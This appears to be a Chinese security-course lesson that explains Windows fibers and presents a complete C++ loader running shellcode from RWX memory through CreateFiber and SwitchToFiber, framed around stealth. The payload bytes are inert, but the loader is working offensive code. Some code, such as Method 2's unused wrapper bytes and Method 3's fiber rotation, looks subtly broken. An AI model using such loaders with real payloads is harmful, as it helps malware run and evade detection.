# 课时12 - C++ Fiber实现ShellCode Loader

## 课程目标
1. 理解Windows纤程（Fiber）机制
2. 掌握Fiber的创建和切换
3. 实现Fiber方式执行ShellCode
4. 了解Fiber的隐蔽性特点

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Fiber | 纤程 | 轻量级用户态线程 |
| ConvertThreadToFiber | - | 将当前线程转换为纤程 |
| CreateFiber | - | 创建新纤程 |
| SwitchToFiber | - | 切换到指定纤程 |

## 代码实现

```cpp
// fiber_loader.cpp
// Fiber方式执行ShellCode

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,
    0x31, 0xC0, 0x40, 0xC3
};

LPVOID g_MainFiber = NULL;

// ShellCode包装函数
void CALLBACK ShellcodeWrapper(LPVOID lpParameter) {
    printf("[Fiber] Shellcode fiber started\n");
    
    LPVOID mem = (LPVOID)lpParameter;
    
    typedef int (*SC_FUNC)();
    SC_FUNC func = (SC_FUNC)mem;
    int result = func();
    
    printf("[Fiber] Shellcode returned: %d\n", result);
    
    // 切回主纤程
    if (g_MainFiber) {
        SwitchToFiber(g_MainFiber);
    }
}

// 方法1: 基础Fiber执行
void Method1_BasicFiber() {
    printf("[*] Method 1: Basic Fiber\n");
    
    // 分配可执行内存
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 转换主线程为纤程
    g_MainFiber = ConvertThreadToFiber(NULL);
    if (!g_MainFiber) {
        printf("[-] ConvertThreadToFiber failed\n");
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    printf("[+] Main fiber: %p\n", g_MainFiber);
    
    // 创建ShellCode纤程
    LPVOID scFiber = CreateFiber(0, ShellcodeWrapper, mem);
    if (!scFiber) {
        printf("[-] CreateFiber failed\n");
        ConvertFiberToThread();
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    
    printf("[+] Shellcode fiber: %p\n", scFiber);
    
    // 切换到ShellCode纤程
    printf("[*] Switching to shellcode fiber...\n");
    SwitchToFiber(scFiber);
    
    printf("[+] Returned to main fiber\n");
    
    // 清理
    DeleteFiber(scFiber);
    ConvertFiberToThread();
    VirtualFree(mem, 0, MEM_RELEASE);
}

// 方法2: 直接使用ShellCode作为Fiber入口
void Method2_DirectFiber() {
    printf("[*] Method 2: Direct Shellcode Fiber\n");
    
    // 需要修改ShellCode以支持Fiber调用约定
    // Fiber入口: void CALLBACK FiberProc(LPVOID lpParameter)
    
    // 创建一个包装ShellCode，最后切回主纤程
    unsigned char wrapper[] = {
        // 保存参数（主纤程地址）
        #ifdef _WIN64
        0x48, 0x89, 0xC8,       // mov rax, rcx
        #else
        0x8B, 0x44, 0x24, 0x04, // mov eax, [esp+4]
        #endif
        // 执行原始ShellCode
        0x90, 0x90, 0x31, 0xC0, 0x40,
        // 切回主纤程
        #ifdef _WIN64
        0x48, 0x89, 0xC1,       // mov rcx, rax
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp [rip+0]
        #else
        0x50,                   // push eax
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp [SwitchToFiber]
        #endif
    };
    
    // 简化演示，使用包装函数
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    g_MainFiber = ConvertThreadToFiber(NULL);
    
    LPVOID scFiber = CreateFiber(0, ShellcodeWrapper, mem);
    
    SwitchToFiber(scFiber);
    
    DeleteFiber(scFiber);
    ConvertFiberToThread();
    VirtualFree(mem, 0, MEM_RELEASE);
    
    printf("[+] Method 2 completed\n");
}

// 方法3: 多个Fiber轮换
LPVOID g_Fibers[3] = { NULL };
int g_CurrentFiber = 0;

void CALLBACK Fiber1Proc(LPVOID lpParameter) {
    printf("[Fiber1] Starting\n");
    for (int i = 0; i < 3; i++) {
        printf("[Fiber1] Iteration %d\n", i);
        SwitchToFiber(g_Fibers[(g_CurrentFiber + 1) % 3]);
    }
    SwitchToFiber(g_MainFiber);
}

void CALLBACK Fiber2Proc(LPVOID lpParameter) {
    printf("[Fiber2] Starting - executing shellcode\n");
    
    LPVOID mem = (LPVOID)lpParameter;
    typedef int (*SC_FUNC)();
    ((SC_FUNC)mem)();
    
    for (int i = 0; i < 3; i++) {
        printf("[Fiber2] Iteration %d\n", i);
        SwitchToFiber(g_Fibers[(g_CurrentFiber + 1) % 3]);
    }
    SwitchToFiber(g_MainFiber);
}

void Method3_MultipleFibers() {
    printf("[*] Method 3: Multiple Fibers\n");
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!mem) return;
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    g_MainFiber = ConvertThreadToFiber(NULL);
    g_Fibers[0] = g_MainFiber;
    g_Fibers[1] = CreateFiber(0, Fiber1Proc, NULL);
    g_Fibers[2] = CreateFiber(0, Fiber2Proc, mem);
    
    printf("[*] Switching between fibers...\n");
    SwitchToFiber(g_Fibers[1]);
    
    printf("[+] All fibers completed\n");
    
    DeleteFiber(g_Fibers[1]);
    DeleteFiber(g_Fibers[2]);
    ConvertFiberToThread();
    VirtualFree(mem, 0, MEM_RELEASE);
}

int main() {
    printf("========================================\n");
    printf("     Fiber ShellCode Loader            \n");
    printf("========================================\n\n");
    
    Method1_BasicFiber();
    printf("\n");
    
    Method2_DirectFiber();
    printf("\n");
    
    Method3_MultipleFibers();
    
    return 0;
}
```

## 课后作业

### 作业1：Fiber池
实现一个Fiber池，管理多个ShellCode执行。

### 作业2：Fiber与异常
在Fiber中添加异常处理机制。
